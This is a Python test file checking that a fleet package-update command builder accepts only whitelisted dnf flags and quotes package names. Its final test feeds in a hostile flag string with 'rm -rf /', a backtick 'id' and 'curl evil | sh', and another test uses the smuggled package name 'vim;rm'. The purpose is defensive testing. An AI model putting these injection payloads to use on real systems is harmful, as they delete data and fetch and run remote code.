"""
Opt-in resolver flags for the "Install all updates" path.

When a dnf/yum update dead-ends on a dependency conflict ("nothing provides…"), the
operator can pass --nobest / --skip-broken / --allowerasing. The flags are WHITELISTED,
never free-form, so the value can't inject shell into the fleet update command.
"""
from client import _api_automation as a


def test_no_flags_is_plain_upgrade():
    cmd = a.cmd_update_packages()
    assert '"$PKGMGR" upgrade -y' in cmd
    assert "--nobest" not in cmd and "--skip-broken" not in cmd


def test_whitelisted_flags_are_applied_to_rpm_only():
    cmd = a.cmd_update_packages("", "nobest skip-broken")
    assert '"$PKGMGR" upgrade -y --nobest --skip-broken' in cmd
    # apt/zypper branches don't get the dnf-only flags.
    assert "apt-get upgrade -y --nobest" not in cmd
    assert "zypper --non-interactive update --nobest" not in cmd


def test_flags_accept_leading_dashes_and_dedupe():
    cmd = a.cmd_update_packages("", "--nobest --nobest allowerasing")
    assert '"$PKGMGR" upgrade -y --nobest --allowerasing' in cmd


def test_named_packages_with_flags():
    cmd = a.cmd_update_packages("vim", "nobest")
    # `--` end-of-options separator sits between the flags and the package operands
    # (defence-in-depth against package-name option injection).
    assert '"$PKGMGR" update -y --nobest -- vim' in cmd
    # A name with shell metacharacters is quoted (injection-safe), flag still applied.
    assert "'vim;rm'" in a.cmd_update_packages("vim;rm", "nobest")


def test_unknown_flags_and_injection_are_dropped():
    cmd = a.cmd_update_packages("", "nobest; rm -rf / --skip-broken `id` && curl evil | sh")
    # Only the real, whitelisted flag survives ("nobest;" != "nobest", so it's dropped too);
    # nothing hostile reaches the shell.
    assert '"$PKGMGR" upgrade -y --skip-broken' in cmd
    assert "--nobest" not in cmd
    for bad in ("rm ", "`id`", "curl evil", "rf /", "nobest;"):
        assert bad not in cmd
